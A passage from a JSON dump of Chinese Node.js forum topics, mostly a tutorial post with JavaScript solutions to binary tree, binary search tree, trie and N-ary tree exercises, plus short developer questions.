关注我！\n<img src=\"https://user-gold-cdn.xitu.io/2019/3/22/169a2cd4fe961a90?w=960&amp;h=260&amp;f=jpeg&amp;s=58713\" alt></p>\n</div>","title":"[译]使用 JavaScript 对象 Rest 和 Spread 的7个技巧","last_reply_at":"2019-03-22T01:53:03.554Z","good":false,"top":false,"reply_count":1,"visit_count":334,"create_at":"2019-03-22T00:34:13.709Z","author":{"loginname":"oliyg","avatar_url":"https://avatars1.githubusercontent.com/u/19631785?v=4&s=120"}},{"id":"5c4937c73b948a2b4ab710f0","author_id":"5b1d495729e6e510415b29b0","tab":"ask","content":"<div class=\"markdown-text\"><p>老代码用的是es5的规范，然后有些模块也已经很老了（express用的3.x）。能否在模块不变的情况下，将node版本升级到最新的持久版，然后将老代码的回调改成async/await ？</p>\n</div>","title":"公司项目升级，大佬们有什么建议吗？","last_reply_at":"2019-03-21T14:10:05.064Z","good":false,"top":false,"reply_count":6,"visit_count":1836,"create_at":"2019-01-24T03:57:59.963Z","author":{"loginname":"helloHT","avatar_url":"https://avatars3.githubusercontent.com/u/31006740?v=4&s=120"}},{"id":"596eb7768f05de0819fdb301","author_id":"538ebff9c3ee0b58208376c7","tab":"ask","content":"<div class=\"markdown-text\"><p>如题。知道内情的进来说说？<a href=\"/user/alsotang\">@alsotang</a> and <a href=\"/user/i5ting\">@i5ting</a>？</p>\n</div>","title":"听说明年2月之前要禁止所有个人用户使用VPN，是真的吗？","last_reply_at":"2019-03-21T06:22:54.582Z","good":false,"top":false,"reply_count":39,"visit_count":7332,"create_at":"2017-07-19T01:35:50.929Z","author":{"loginname":"zhanzhenzhen","avatar_url":"https://avatars3.githubusercontent.com/u/731796?v=4&s=120"}},{"id":"5c8e18657ce0df3732428da8","author_id":"5ac77987e34737560fccaa7b","tab":"share","content":"<div class=\"markdown-text\"><p><img src=\"https://unsplash.it/1380/825?random\" alt=\"image\"></p>\n<p>&lt;!–more–&gt;</p>\n<h2>前言</h2>\n<p>数据结构和算法的知识博大精深, 这里只是对这几种数据结构做一些简单的介绍。并对leetcode上部分相关的简单和中等题做出解答。还请各位看官见谅</p>\n<h2>二叉树</h2>\n<p>二叉树是一种典型的树状结构, 二叉树每一个节点最多有两个子树的结构。以下是遍历二叉树的几种方式, 总的来说使用递归的方式, 还是非常好理解的。</p>\n<p><img src=\"https://i.loli.net/2019/03/16/5c8d0e77d7aaf.png\" alt=\"image\"></p>\n<h3>深度优先遍历 前序遍历</h3>\n<p>前序遍历首先访问根节点，然后遍历左子树，最后遍历右子树</p>\n<p>节点遍历的顺序: <strong>F, B, A, D, C, E, G, I, H</strong></p>\n<pre class=\"prettyprint language-js\"><code>\nvar preorderTraversal = function (root) {\n  let result = []\n\n  const traversing = (node) =&gt; {\n    &#x2F;&#x2F; 结束递归\n    if (!node) return []\n\n    &#x2F;&#x2F; 首先遍历当前的节点\n    result.push(node.val)\n    &#x2F;&#x2F; 如果有左子树优先遍历左子树\n    if (node.left) {\n      result.concat(traversing(node.left))\n    }\n    &#x2F;&#x2F; 遍历又子树\n    if (node.right) {\n      result.concat(traversing(node.right))\n    }\n  }\n\n  traversing(root)\n\n  return result\n}\n</code></pre><h3>深度优先遍历 中序遍历</h3>\n<p>中序遍历是先遍历左子树，然后访问根节点，然后遍历右子树</p>\n<p>节点遍历的顺序: <strong>A, B, C, D, E, F, G, H, I</strong></p>\n<pre class=\"prettyprint language-js\"><code>\nvar inorderTraversal = function (root) {\n  let result = []\n  const traversing = (node) =&gt; {\n    if (!node) return\n    &#x2F;&#x2F; 优先遍历左子树\n    if (node.left) {\n      traversing(node.left)\n    }\n    &#x2F;&#x2F; 然后获取当前的节点\n    if (node.val) {\n      result.push(node.val)\n    }\n    &#x2F;&#x2F; 然后遍历右子树\n    if (node.right) {\n      traversing(node.right)\n    }\n  }\n  traversing(root)\n  return result\n}\n</code></pre><h3>深度优先遍历 后序遍历</h3>\n<p>先遍历左子树，然后遍历右子树，最后访问树的根节点</p>\n<p>节点遍历的顺序: <strong>A, C, E, D, B, H, I, G, F</strong></p>\n<pre class=\"prettyprint language-js\"><code>\nvar postorderTraversal = function (root) {\n  let result = []\n  const traversing = (node) =&gt; {\n    if (!node) return\n    if (node.left) {\n      traversing(node.left)\n    }\n    if (node.right) {\n      traversing(node.right)\n    }\n    if (node.val) {\n      result.push(node.val)\n    }\n  }\n  traversing(root)\n  return result\n};\n</code></pre><h3>广度优先遍历</h3>\n<p>广度优先搜索是一种广泛运用在树或图这类数据结构中，遍历或搜索的算法。该算法从一个根节点开始，首先访问节点本身。然后依次遍历它的二级邻节点、三级邻节点，以此类推。我们这里依然使用递归遍历, 但是我们在递归中添加level参数用来确定当前节点的层级。</p>\n<p><img src=\"https://i.loli.net/2019/03/17/5c8dc14a0c96d.png\" alt=\"image\"></p>\n<pre class=\"prettyprint language-js\"><code>\nvar levelOrder = function (root) {\n  let result = []\n\n  const traversing = (node, level) =&gt; {\n    if (!node) return\n    if (!result[level]) result[level] = []\n    result[level].push(node.val)\n    if (node.left) {\n      traversing(node.left, level + 1)\n    }\n    if (node.right) {\n      traversing(node.right, level + 1)\n    }\n  }\n\n  traversing(root, 0)\n  return result\n}\n</code></pre><h3>二叉树的最大深度</h3>\n<h4>题目</h4>\n<p>给定一个二叉树，找出其最大深度。二叉树的深度为根节点到最远叶子节点的最长路径上的节点数。</p>\n<h4>思路</h4>\n<p>对当前的二叉树使用后序遍历。如果当前节点没有左子树并且没有右子树, 说明这个节点是当前分支中最深的节点, 我们记录它自身的最大深度为1(<strong>因为它自身没有子节点</strong>)。如果当前节点有左子树和右子树, 我们取左右子树中最大的深度(<strong>因为是后序遍历, 在遍历当前根节点时, 左右树已经被遍历了</strong>)。取最大深度后加一就是当前节点的深度。</p>\n<h4>解答</h4>\n<pre class=\"prettyprint language-js\"><code>\nvar maxDepth = function(root) {\n  if (!root) return 0\n\n  const traversing = (node) =&gt; {\n    if (!node) return\n\n    if (!node.left &amp;&amp; !node.right) {\n      node.depth = 1\n      return\n    }\n    if (node.left) {\n      traversing(node.left)\n    }\n    if (node.right) {\n      traversing(node.right)  \n    }\n    let max_left_depth = 0\n    let max_right_depth = 0\n\n    if (node.left) {\n      max_left_depth = node.left.depth\n    }\n    if (node.right) {\n      max_right_depth = node.right.depth\n    }\n\n    node.depth = Math.max(max_left_depth, max_right_depth) + 1\n  }\n\n  traversing(root)\n\n  return root.depth\n}\n</code></pre><h3>对称二叉树</h3>\n<p>给定一个二叉树，检查它是否是镜像对称的</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; 对称二叉树\n    1\n   &#x2F; \\\n  2   2\n &#x2F; \\ &#x2F; \\\n3  4 4  3\n\n&#x2F;&#x2F; 不是对称二叉树\n    1\n   &#x2F; \\\n  2   2\n   \\   \\\n   3    3\n</code></pre><h4>思路</h4>\n<p>采用BFS遍历, 获取每一级的所有节点结果集, 不存在的子节点使用null代替。判断每一级的节点是否能构成回文字符串即可。</p>\n<h4>解答</h4>\n<pre class=\"prettyprint language-js\"><code>\nvar isSymmetric = function(root) {\n  &#x2F;&#x2F; BFS遍历\n  let result = []\n  const traversing = (node, level) =&gt; { \n      \n    if (!result[level]) result[level] = []\n    \n    &#x2F;&#x2F; 不存在的节点使用null填充\n    if (!node) {\n      &#x2F;&#x2F; 终止递归\n      return result[level].push(&#x27;null&#x27;)\n    } else {\n      result[level].push(node.val)\n    }\n      \n    if (node.left) {\n      traversing(node.left, level + 1)\n    } else {\n      traversing(null, level + 1)  \n    }\n      \n    if (node.right) {\n      traversing(node.right, level + 1)\n    } else {\n      traversing(null, level + 1) \n    }\n      \n  }\n  \n  traversing(root, 0)\n  \n  &#x2F;&#x2F; 判断每一级的结果能否构成回文字符串\n  for (let i = 0; i &lt; result.length - 1; i++) {\n    if (result[i].join(&#x27;&#x27;) !== result[i].reverse().join(&#x27;&#x27;)) {\n      return false\n    }\n  }\n  return true\n};\n</code></pre><h3>路径总和</h3>\n<h4>题目</h4>\n<p>给定一个二叉树和一个目标和，判断该树中是否存在根节点到叶子节点的路径，这条路径上所有节点值相加等于目标和。</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; 给定目标sum = 22\n&#x2F;&#x2F; 5-&gt;4-&gt;11-&gt;2和为22, 返回true\n\n              5\n             &#x2F; \\\n            4   8\n           &#x2F;   &#x2F; \\\n          11  13  4\n         &#x2F;  \\      \\\n        7    2      1\n</code></pre><h4>思路</h4>\n<p>我们采用前序遍历, 每次遍历使用目标减去当前节点的值，并将新的目标带入下一次的递归中。如果当遍历到最深处的节点，并且节点的值等于目标的值。说明二叉树拥有路径的和等于目标值。</p>\n<h4>解答</h4>\n<pre class=\"prettyprint language-js\"><code>\nvar hasPathSum = function(root, sum) {\n  let result = []\n  const traversing = (root, sum) =&gt; { \n      \n    if (!root) return false\n    \n    &#x2F;&#x2F; 说明拥有路径等于目标的和\n    if (!root.left &amp;&amp; !root.right &amp;&amp; root.val === sum) {\n        result.push(root.val)\n    }\n    \n    if (root.left) {\n        traversing(root.left, sum - root.val) \n    }\n    \n    if (root.right) {\n        traversing(root.right, sum - root.val)\n    } \n  }\n   \n  traversing(root, sum)\n\n  return result.length &gt; 0\n};\n</code></pre><h3>从中序与后序遍历序列构造二叉树</h3>\n<h4>题目</h4>\n<p>根据一棵树的中序遍历与后序遍历构造二叉树。</p>\n<pre class=\"prettyprint language-js\"><code>\n&#x2F;&#x2F; 中序遍历 inorder = [9,3,15,20,7]\n&#x2F;&#x2F; 后序遍历 postorder = [9,15,7,20,3]\n\n&#x2F;&#x2F; 构建结果\n    3\n   &#x2F; \\\n  9  20\n    &#x2F;  \\\n   15   7\n</code></pre><h4>思路</h4>\n<p>思路与<strong>从前序与中序遍历序列构造二叉树</strong>题类似，这里不在赘述</p>\n<h4>解答</h4>\n<pre class=\"prettyprint language-js\"><code>\nvar buildTree = function(inorder, postorder) {\n    let binaryTree = {}\n   \n  const iteration = (postorder, inorder, tree) =&gt; {\n       \n      if (!postorder.length) {\n          binaryTree = null\n          return\n      }\n       \n      tree.val = null\n      tree.left = {\n          val: null,\n          left: null,\n          right: null\n      }\n      tree.right = {\n          val: null,\n          left: null,\n          right: null\n      }\n\n     &#x2F;&#x2F; 前序遍历第一个节点为当前树的根节点\n     let rootVal = postorder.splice(postorder.length - 1, 1)[0]\n     &#x2F;&#x2F; 中序遍历根节点的索引\n     let rootIndex = inorder.indexOf(rootVal)\n     &#x2F;&#x2F; 中序遍历的左子树\n     let inorderLeftTree = inorder.slice(0, rootIndex)\n     &#x2F;&#x2F; 中序遍历的右子树\n     let inorderRightTree = inorder.slice(rootIndex + 1)\n     &#x2F;&#x2F; 前序遍历的左子树\n     let postorderLeftTree = postorder.slice(0, inorderLeftTree.length)\n     &#x2F;&#x2F; 前序遍历的右子树\n     let postorderRightTree = postorder.slice(inorderLeftTree.length)\n\n       \n     tree.val = rootVal\n      \n     if (postorderLeftTree.length === 1 || inorderLeftTree.length === 1) {\n         tree.left.val = postorderLeftTree[0]\n     } else if (postorderLeftTree.length &gt; 1 || inorderLeftTree.length &gt; 1) {\n         iteration(postorderLeftTree, inorderLeftTree, tree.left)\n     } else {\n          tree.left = null\n     }\n       \n     if (postorderRightTree.length === 1 || inorderRightTree.length === 1) {\n         tree.right.val = postorderRightTree[0]\n     } else if (postorderRightTree.length &gt; 1 || inorderRightTree.length &gt; 1) {\n         iteration(postorderRightTree, inorderRightTree, tree.right)\n     } else {\n      tree.right = null\n     }\n  }\n   \n  iteration(postorder, inorder, binaryTree)\n   \n  return binaryTree\n}\n</code></pre><h3>从前序与中序遍历序列构造二叉树</h3>\n<h4>思路</h4>\n<p>本题依然采用递归的思路, 前序遍历的第一个节点为二叉树的根节点，以此作为突破口。</p>\n<p>本题的前置条件是树中不存在重复的元素。可以由中序遍历的结果以及根节点值获取根节点的左子树以及右子树。</p>\n<p>我们这时可以获得根节点左子树和右子树的长度。反过来可以获取前序遍历结果中的左右子树。我们这时，把左右子树再当成一颗二叉树，使用递归的形式重复此过程。既可以推导出整颗二叉树。</p>\n<h4>解答</h4>\n<pre class=\"prettyprint language-js\"><code>\nvar buildTree = function(preorder, inorder) {\n     \n  let binaryTree = {}\n   \n  const iteration = (preorder, inorder, tree) =&gt; {\n       \n      if (!preorder.length) {\n          binaryTree = null\n          return\n      }\n       \n      tree.val = null\n      tree.left = {\n          val: null,\n          left: null,\n          right: null\n      }\n      tree.right = {\n          val: null,\n          left: null,\n          right: null\n      }\n\n     &#x2F;&#x2F; 前序遍历第一个节点为当前树的根节点\n     let rootVal = preorder.splice(0, 1)[0]\n     &#x2F;&#x2F; 中序遍历根节点的索引\n     let rootIndex = inorder.indexOf(rootVal)\n     &#x2F;&#x2F; 中序遍历的左子树\n     let inorderLeftTree = inorder.slice(0, rootIndex)\n     &#x2F;&#x2F; 中序遍历的右子树\n     let inorderRightTree = inorder.slice(rootIndex + 1)\n     &#x2F;&#x2F; 前序遍历的左子树\n     let preorderLeftTree = preorder.slice(0, inorderLeftTree.length)\n     &#x2F;&#x2F; 前序遍历的右子树\n     let preorderRightTree = preorder.slice(inorderLeftTree.length)\n\n       \n     tree.val = rootVal\n      \n     if (preorderLeftTree.length === 1 || inorderLeftTree.length === 1) {\n         tree.left.val = preorderLeftTree[0]\n     } else if (preorderLeftTree.length &gt; 1 || inorderLeftTree.length &gt; 1) {\n         iteration(preorderLeftTree, inorderLeftTree, tree.left)\n     } else {\n          tree.left = null\n     }\n       \n     if (preorderRightTree.length === 1 || inorderRightTree.length === 1) {\n         tree.right.val = preorderRightTree[0]\n     } else if (preorderRightTree.length &gt; 1 || inorderRightTree.length &gt; 1) {\n         iteration(preorderRightTree, inorderRightTree, tree.right)\n     } else {\n      tree.right = null\n     }\n  }\n   \n  iteration(preorder, inorder, binaryTree)\n   \n  return binaryTree\n}\n</code></pre><h2>二叉搜索树</h2>\n<p>二叉搜索树是二叉树的一种特殊形式。 二叉搜索树具有以下性质：每个节点中的值必须大于（或等于）其左侧子树中的任何值，但小于（或等于）其右侧子树中的任何值。</p>\n<p><strong>对于二叉搜索树，我们可以通过中序遍历得到一个递增的有序序列</strong></p>\n<h3>验证二叉搜索树</h3>\n<p>给定一个二叉树，判断其是否是一个有效的二叉搜索树。</p>\n<h4>思路</h4>\n<p>可以通过中序DFS遍历二叉搜索树, 判断遍历的结果是否为递增的数组判断是否为搜索二叉树</p>\n<h4>解答</h4>\n<pre class=\"prettyprint language-js\"><code>\nvar isValidBST = function(root) {\n    if (!root) return true\n    \n    &#x2F;&#x2F; 中序DFS\n    let result = []    \n\n    const iteration = (root) =&gt; {\n       if (root.left) {\n           iteration(root.left)\n       }\n       result.push(root.val)\n       if (root.right) {\n           iteration(root.right)\n       }\n    }\n    iteration(root)\n    let resultString = result.join(&#x27;,&#x27;)\n    let result2String = [...new Set(result.sort((a, b) =&gt; a - b))].join(&#x27;,&#x27;)\n    return resultString === result2String\n};\n</code></pre><h3>在二叉搜索树中实现搜索操作</h3>\n<p>如果目标值等于节点的值，则返回节点, 如果目标值小于节点的值，则继续在左子树中搜索, 如果目标值大于节点的值，则继续在右子树中搜索。</p>\n<p><img src=\"https://i.loli.net/2019/03/17/5c8deb4c07569.png\" alt=\"image\"></p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; 递归就完事了\nvar searchBST = function(root, val) {\n    if (!root) return null\n    \n    let result = null\n    \n    const seatch = (node) =&gt; {\n        if (node.val === val) {\n            return result = node\n        } else if (val &gt; node.val &amp;&amp; node.right) {\n            seatch(node.right)\n        } else if (val &lt; node.val &amp;&amp; node.left) {\n            seatch(node.left)\n        }\n    }\n    \n    seatch(root)\n        \n    return result\n};\n</code></pre><h3>在二叉搜索树中实现插入操作</h3>\n<p>在二叉搜索树中的插入操作和搜索操作类似。根据节点值与目标节点值的关系，搜索左子树或右子树。当节点没有左右子树时。判断目标值和当前节点的关系，执行插入的操作。</p>\n<pre class=\"prettyprint language-js\"><code>\nvar insertIntoBST = function(root, val) {\n    const insert = (root) =&gt; {\n        if (val &gt; root.val) {\n            if (root.right) {\n               insert(root.right) \n            } else {\n               root.right = new TreeNode(val)\n            }\n        } else if (val &lt; root.val) {\n            if (root.left) {\n               insert(root.left)  \n            } else {\n               root.left = new TreeNode(val)\n            }\n        }\n    }\n    \n    insert(root)\n    \n    return root\n};\n</code></pre><h3>在二叉搜索树中实现删除操作</h3>\n<p>删除二叉树的节点的操作复杂度远远大于搜索和插入的操作。删除搜索二叉树节点时, 需要考虑多种状态</p>\n<p><img src=\"https://i.loli.net/2019/03/17/5c8dee6d7813b.png\" alt=\"image\"></p>\n<p>删除的节点没有子节点的时候, 直接移除改节点(从它的父节点上移除)</p>\n<p><img src=\"https://i.loli.net/2019/03/17/5c8deec6c6209.png\" alt=\"image\"></p>\n<p>删除的节点只有一个子节点的时候, 需要将需要删除的节点的父节点, 链接上删除节点的子节点。即可完成删除</p>\n<p><img src=\"https://i.loli.net/2019/03/17/5c8def13bd388.png\" alt=\"image\"></p>\n<p>删除的节点有两个子节点的时候, 需要将删除节点右子树中的最小值, 赋予删除的节点。然后删除右子树中的最小值即可。</p>\n<pre class=\"prettyprint language-js\"><code>\n&#x2F;**\n * Definition for a binary tree node.\n * function TreeNode(val) {\n *     this.val = val;\n *     this.left = this.right = null;\n * }\n *&#x2F;\n&#x2F;**\n * @param {TreeNode} root\n * @param {number} key\n * @return {TreeNode}\n *&#x2F;\nvar deleteNode = function(root, key) {\n    \n    \n    &#x2F;&#x2F; 根节点为空的情况\n    if (!root) {\n        return null\n    }\n    \n    if (!root.left &amp;&amp; !root.right &amp;&amp; root.val === key) {\n        root = null\n        return root\n    }\n    \n    if (!root.left &amp;&amp; root.right &amp;&amp; root.val === key) {\n        root = root.right\n        return root\n    }\n    \n    if (root.left &amp;&amp; !root.right &amp;&amp; root.val === key) {\n       root = root.left\n        return root\n    }\n    \n    &#x2F;&#x2F; 根节点替换的情况\n    \n    &#x2F;&#x2F; 寻找当前树的最小节点\n    const findMin = (root) =&gt; {\n        let min = root\n        while (min.left) {\n            min = min.left\n        }\n        return min\n    }\n    \n    let parentNode = null\n    \n    &#x2F;&#x2F; 找到最近的父级\n    const searchParent = (node, searchValue) =&gt; {\n        console.log(&#x27;???&#x27;)\n        let current = node\n        let breaker = false\n        \n        while (!breaker) {\n            console.log(&#x27;查找父亲&#x27;)\n            if (\n                (current.left &amp;&amp; searchValue === current.left.val) ||\n                (current.right &amp;&amp; searchValue === current.right.val)\n            ) {\n              breaker = true\n            } else if (searchValue &lt; current.val) {\n              current = current.left\n            } else if (searchValue &gt; current.val) {\n              current = current.right\n            } else {\n              current = null\n            }\n\n            if (!current) break\n        }\n        \n        parentNode = current\n    }\n    \n    const remove = (node, deleteValue) =&gt; {\n        if (node.val === deleteValue) {\n            console.log(&#x27;1&#x27;)\n            &#x2F;&#x2F; node为要删除的节点\n            if (!node.left &amp;&amp; !node.right) {\n                console.log(&#x27;3&#x27;)\n                &#x2F;&#x2F; 如果没有任何子节点\n                searchParent(root, node.val)\n                if (parentNode.left &amp;&amp; parentNode.left.val === deleteValue) {\n                    parentNode.left = null\n                } else {\n                    parentNode.right = null\n                }\n            } else if (!node.left &amp;&amp; node.right) {\n                console.log(&#x27;4&#x27;)\n                &#x2F;&#x2F; 如果只有一个子节点\n                searchParent(root, node.val)\n                if (parentNode.left &amp;&amp; parentNode.left.val === deleteValue) {\n                    parentNode.left = node.right\n                } else {\n                    parentNode.right = node.right\n                }\n            } else if (node.left &amp;&amp; !node.right) {\n                console.log(&#x27;5&#x27;)\n                &#x2F;&#x2F; 如果只有一个子节点\n                searchParent(root, node.val)\n                if (parentNode.left &amp;&amp; parentNode.left.val === deleteValue) {\n                    parentNode.left = node.left\n                } else {\n                    parentNode.right = node.left\n                }\n            } else {\n                console.log(&#x27;6&#x27;)\n                &#x2F;&#x2F; 如果有两个子节点\n                &#x2F;&#x2F; 找到右子树中最小的节点\n                let minNode = findMin(node.right)\n                console.log(&#x27;7&#x27;)\n                let minNodeValue = minNode.val\n                console.log(&#x27;8&#x27;)\n                remove(root, minNodeValue)\n                console.log(&#x27;9&#x27;)\n                node.val = minNodeValue\n                console.log(&#x27;10&#x27;)\n            }\n        } else if (deleteValue &gt; node.val &amp;&amp; node.right) {\n            console.log(&#x27;2&#x27;)\n            remove(node.right, deleteValue)\n        } else if (deleteValue &lt; node.val &amp;&amp; node.left) {\n            console.log(&#x27;3&#x27;)\n            remove(node.left, deleteValue)\n        }\n    }\n    \n    remove(root, key)\n    \n    return root\n};\n</code></pre><h3>二叉搜索树的最近公共祖先</h3>\n<p>给定一个二叉搜索树, 找到该树中两个指定节点的最近公共祖先。</p>\n<h4>思路</h4>\n<p>从根节点开始遍历操作, 如果根节点的值大于目标节点1, 小于目标节点2。说明根节点就是最近的公共祖先。</p>\n<p>如果根节点大于目标节点1, 目标节点2，则使用根节点的左子节点重复前一步的操作。</p>\n<p>如果根节点小于目标节点1, 目标节点2，则使用根节点的右子节点重复前一步的操作。</p>\n<h4>解答</h4>\n<pre class=\"prettyprint language-js\"><code>\n&#x2F;**\n * Definition for a binary tree node.\n * function TreeNode(val) {\n *     this.val = val;\n *     this.left = this.right = null;\n * }\n *&#x2F;\n&#x2F;**\n * @param {TreeNode} root\n * @param {TreeNode} p\n * @param {TreeNode} q\n * @return {TreeNode}\n *&#x2F;\nvar lowestCommonAncestor = function(root, p, q) {\n    if (root.val &gt; p.val &amp;&amp; root.val &gt; q.val) {\n        return lowestCommonAncestor(root.left, p, q)\n    }\n    if (root.val &lt; p.val &amp;&amp; root.val &lt; q.val) {\n        return lowestCommonAncestor(root.right, p, q)\n    }\n    return root\n};\n</code></pre><h2>前缀树</h2>\n<p><img src=\"https://i.loli.net/2019/03/17/5c8df594a7d02.png\" alt=\"image\"></p>\n<p>前缀树是N叉树的一种特殊形式。前缀树的每一个节点通常表示一个字符或者字符串。每一个节点拥有多个不同的子节点。值得注意的是，根节点表示空字符串。</p>\n<p><strong>前缀树的一个重要的特性是，节点所有的后代都与该节点相关的字符串有着共同的前缀。这就是前缀树名称的由来。</strong></p>\n<h3>如何表示一个Trie树?</h3>\n<p>方法1, 使用长度为26的数组存储子节点</p>\n<p>方法2, 使用hashMap存储子节点</p>\n<h3>实现 Trie (前缀树)</h3>\n<pre class=\"prettyprint language-js\"><code>\nvar TrieNode = function (val = null) {\n    &#x2F;&#x2F; 当前的值\n    this.val = val\n    &#x2F;&#x2F; 当前节点的子节点\n    this.children = {}\n    &#x2F;&#x2F; 表示当前节点是否为一个单词\n    this.isWord = false\n}\n\n&#x2F;&#x2F; 添加到节点\nTrieNode.prototype.add = function (val) {\n    let child = new TrieNode(val)\n    this.children[val] = child\n    return this.children[val]\n}\n\n&#x2F;&#x2F; 判断是否包含子节点\nTrieNode.prototype.has = function (val) {\n    return this.children[val] ? true : false\n}\n\n&#x2F;**\n * Initialize your data structure here.\n *&#x2F;\nvar Trie = function() {\n    &#x2F;&#x2F; 初始化根节点\n    this.root = new TrieNode(&#x27;&#x27;)\n};\n\n&#x2F;**\n * Inserts a word into the trie. \n * @param {string} word\n * @return {void}\n *&#x2F;\nTrie.prototype.insert = function(word) {\n    let current = this.root\n    let words = word.split(&#x27;&#x27;)\n    let i = 0\n    &#x2F;&#x2F; 替换最后一个节点\n    while (i &lt; words.length) {\n        if (!current.has(words[i])) {\n           &#x2F;&#x2F; 如果不存在该子节点\n           current = current.add(words[i])\n        } else {\n           &#x2F;&#x2F; 如果存在该子节点\n           current = current.children[words[i]]\n        }\n        i += 1\n    }\n    current.isWord = true\n};\n\n&#x2F;**\n * Returns if the word is in the trie. \n * 判断是否存在单词\n * @param {string} word\n * @return {boolean}\n *&#x2F;\nTrie.prototype.search = function(word) {\n    let current = this.root\n    let words = word.split(&#x27;&#x27;)\n    let i = 0\n    let result = null\n    while (i &lt; words.length) {\n        if (current.has(words[i])) {\n            current = current.children[words[i]]\n            i += 1 \n        } else {\n            return false\n        }\n    }\n    return current.isWord\n\n};\n\n&#x2F;**\n * Returns if there is any word in the trie that starts with the given prefix. \n * 判断是否包含单词\n * @param {string} prefix\n * @return {boolean}\n *&#x2F;\nTrie.prototype.startsWith = function(prefix) {\n    let current = this.root\n    let prefixs = prefix.split(&#x27;&#x27;)\n    let i = 0\n    while (i &lt; prefixs.length) {\n        if (current.has(prefixs[i])) {\n            current = current.children[prefixs[i]]\n            i += 1 \n        } else {\n            return false\n        }\n    }\n    return true\n};\n\n&#x2F;** \n * Your Trie object will be instantiated and called as such:\n * var obj = Object.create(Trie).createNew()\n * obj.insert(word)\n * var param_2 = obj.search(word)\n * var param_3 = obj.startsWith(prefix)\n *&#x2F;\n</code></pre><h3>单词替换</h3>\n<p>在英语中，我们有一个叫做 词根(root)的概念，它可以跟着其他一些词组成另一个较长的单词——我们称这个词为 继承词(successor)。例如，词根an，跟随着单词 other(其他)，可以形成新的单词 another(另一个)。</p>\n<p>现在，给定一个由许多词根组成的词典和一个句子。你需要将句子中的所有继承词用词根替换掉。如果继承词有许多可以形成它的词根，则用最短的词根替换它。</p>\n<p>输入: dict(词典) = [“cat”, “bat”, “rat”]</p>\n<p>sentence(句子) = “the cattle was rattled by the battery”</p>\n<p>输出: “the cat was rat by the bat”</p>\n<h4>思路</h4>\n<h4>解答</h4>\n<pre class=\"prettyprint language-js\"><code>\nvar replaceWords = function(dict, sentence) {\n    let sentences = sentence.split(&#x27; &#x27;)\n    let result = []\n    \n    for (let i = 0; i &lt; sentences.length; i++) {\n        let trie = new Trie()\n        &#x2F;&#x2F; 句子中的每一个词形成一个前缀树\n        trie.insert(sentences[i])\n        let min = sentences[i]\n        for (let j = 0; j &lt; dict.length; j++) {\n            &#x2F;&#x2F; 判断是否包含词根\n            if (trie.startsWith(dict[j])) {\n                &#x2F;&#x2F; 取最短的词根\n                min = min.length &lt; dict[j].length ? min : dict[j]\n            }\n        }\n        result.push(min)\n    }\n    \n    return result.join(&#x27; &#x27;)\n};\n</code></pre><h2>N叉树</h2>\n<p><img src=\"https://i.loli.net/2019/03/17/5c8dfa8e7d92a.png\" alt=\"image\"></p>\n<h3>N叉树的前序遍历</h3>\n<p>先访问根节点，然后以此遍历根节点的所有子节点。如果子节点存在子节点。同根节点一样，先遍历自身然后遍历它的子节点。</p>\n<pre class=\"prettyprint language-js\"><code>\nvar preorder = function(root) {\n    \n    let result = []\n    \n    const iteration = (root) =&gt; {\n        if (!root) return\n        \n        result.push(root.val)\n        \n        if (root.children) {\n           for (let i = 0; i &lt; root.children.length; i++) {\n                iteration(root.children[i]) \n           } \n        }\n    }\n    \n    iteration(root)\n    \n    return result\n}\n</code></pre><h3>N叉树的后序遍历</h3>\n<p>优先遍历根节点的所有子节点，如果子节点存在子节点，则优先遍历其它的子节点</p>\n<pre class=\"prettyprint language-js\"><code>\nvar postorder = function(root) {\n    let result = []\n    \n    const iteration = (root) =&gt; {\n        if (!root) return\n        \n        if (root.children) {\n            for (let i = 0; i &lt; root.children.length; i++) {\n                iteration(root.children[i])\n            }\n        }\n        \n        result.push(root.val)\n    }\n    \n    iteration(root)\n    \n    return result\n};\n</code></pre><h3>N叉树的层序遍历</h3>\n<pre class=\"prettyprint language-js\"><code>\nvar levelOrder = function (root) {\n    let reuslt = []\n\n    const iteration = (root, level) =&gt; {\n        if (!root) return\n\n        if (!reuslt[level]) {\n            reuslt[level] = []\n        }\n\n        reuslt[level].push(root.val)\n\n        for (let i = 0; i &lt; root.children.length; i++) {\n            iteration(root.children[i], level + 1)\n        }\n    }\n\n    iteration(root, 0)\n\n    return reuslt\n};\n</code></pre><h3>N叉树最大深度</h3>\n<p>给定一个 N 叉树，找到其最大深度。最大深度是指从根节点到最远叶子节点的最长路径上的节点总数。</p>\n<h4>思路</h4>\n<p>思路很简单, BFS整个N叉树, 返回结果的长度即可</p>\n<h4>解答</h4>\n<pre class=\"prettyprint language-js\"><code>\nvar maxDepth = function(root) {\n    let reuslt = []\n\n    const iteration = (root, level) =&gt; {\n        if (!root) return\n\n        if (!reuslt[level]) {\n            reuslt[level] = []\n        }\n\n        reuslt[level].push(root.val)\n\n        for (let i = 0; i &lt; root.children.length; i++) {\n            iteration(root.children[i], level + 1)\n        }\n\n    }\n\n    iteration(root, 0)\n\n    return reuslt.length\n};\n</code></pre></div>","title":"【写的很浅显】 二叉树, 前缀树, N叉树","last_reply_at":"2019-03-21T06:08:46.749Z","good":false,"top":false,"reply_count":3,"visit_count":673,"create_at":"2019-03-17T09:50:29.393Z","author":{"loginname":"BengBu-YueZhang","avatar_url":"https://avatars3.githubusercontent.com/u/24958677?v=4&s=120"}},{"id":"5c92310e8a587f26b426d13f","author_id":"59bb6e2d3c896622428ec766","tab":"ask","content":"<div class=\"markdown-text\"><p>如题，我们服务的架构大概是:microservice-&gt;nginx-&gt;microservice。老大说，nginx上记录到长连接的比例很低，大量的1。但是我们的node服务是有这个的：\nhttp.globalAgent.keepAlive = true\nhttp.globalAgent.keepAliveMsecs = 60 * 1000</p>\n</div>","title":"怎么才能监控node服务的长连接和短连接的比列？","last_reply_at":"2019-03-21T04:33:18.305Z","good":false,"top":false,"reply_count":3,"visit_count":443,"create_at":"2019-03-20T12:24:46.178Z","author":{"loginname":"gyj1278","avatar_url":"https://avatars0.githubusercontent.com/u/12684904?v=4&s=120"}},{"id":"51508570604b3d512113f1b3","author_id":"4fa8ab21b92b054850016ccf","content":"<div 